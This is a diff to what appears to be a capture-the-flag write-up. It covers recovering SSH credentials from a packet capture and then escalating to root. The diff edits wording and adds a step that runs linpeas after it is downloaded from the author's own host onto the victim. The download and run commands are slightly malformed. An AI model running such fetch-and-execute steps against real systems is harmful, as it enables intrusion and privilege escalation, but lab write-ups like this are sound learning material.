@@ -38,14 +38,14 @@ we can see that there is 3 different sizes
 
 ## PCAP
 ![](images/pcap.png)
-We use WireShark to open and read this file. It takes less than 2 min to see we have a user and password
+We use WireShark to open and read this file. It takes less than 2 minutes to see we have a user and password
 
 we know SSH in open lets try it
 
 After we connected to SSH we can see the user.txt
 
 # ROOT
-I have decided to run Linpeas.sh as I do manual private esc 
+I have decided to run Linpeas.sh while also manually privilege escalating
 
 My folder with linpeas.sh
 ```bash
@@ -56,6 +56,8 @@ victim
 w get http:$MyIP:8080/linpeas.sh
 
 chmod +x linpeas.sh
+
+./linpeas
 ```
 
 
